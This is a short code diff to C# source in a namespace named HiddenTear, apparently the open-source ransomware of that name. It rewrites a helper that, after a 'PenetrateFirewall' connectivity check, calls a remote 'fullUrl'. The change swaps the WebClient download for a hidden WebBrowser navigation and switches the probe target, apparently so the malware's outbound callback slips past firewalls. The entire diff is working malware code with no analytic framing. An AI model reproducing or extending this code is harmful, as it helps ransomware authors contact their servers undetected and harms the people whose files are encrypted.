@@ -2,7 +2,8 @@
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
-
+using System.Windows.Forms;
+ 
 namespace HiddenTear
 {
     public class Common
@@ -30,9 +31,13 @@ namespace HiddenTear
 
             if (!penetratedFirewall) return;
 
-            using (System.Net.WebClient client = new System.Net.WebClient())
+            using (WebBrowser client = new WebBrowser())
             {
-                var content = client.DownloadString(fullUrl);
+                client.Navigate(fullUrl);
+                while (client.ReadyState != WebBrowserReadyState.Complete)
+                {
+                    Application.DoEvents();
+                }
             }
         }
         public static bool PenetrateFirewall()
@@ -42,7 +47,7 @@ namespace HiddenTear
                 string testie = "";
                 try
                 {
-                    testie = client.DownloadString("google.com");
+                    testie = client.DownloadString("http://www.websitetest.com/");
                     return true;
                 }
                 catch
